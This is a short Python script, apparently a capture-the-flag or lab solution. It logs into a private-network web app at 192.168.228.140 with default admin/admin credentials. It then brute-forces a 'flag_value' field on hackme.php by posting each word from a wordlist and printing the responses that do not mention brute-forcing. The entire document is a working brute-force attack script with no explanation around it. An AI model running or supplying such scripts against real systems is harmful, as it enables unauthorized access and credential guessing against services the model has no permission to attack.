import requests
lines = []

with open("raft-small-words.txt","r") as raft:
    lines = raft.readlines()

s = requests.Session()

credentioals = {
'username': 'admin',
'password': 'admin'
}

response = s.post('http://192.168.228.140/check.php', data=credentioals)
print(response.text)


for i in lines:
    mydata = {'flag_value':i.replace("\n","")}

    response1 = s.post('http://192.168.228.140/hackme.php', data=mydata)

    currentpagetext = response1.text

    if "brute-force" not in currentpagetext:
        print(response1.text)

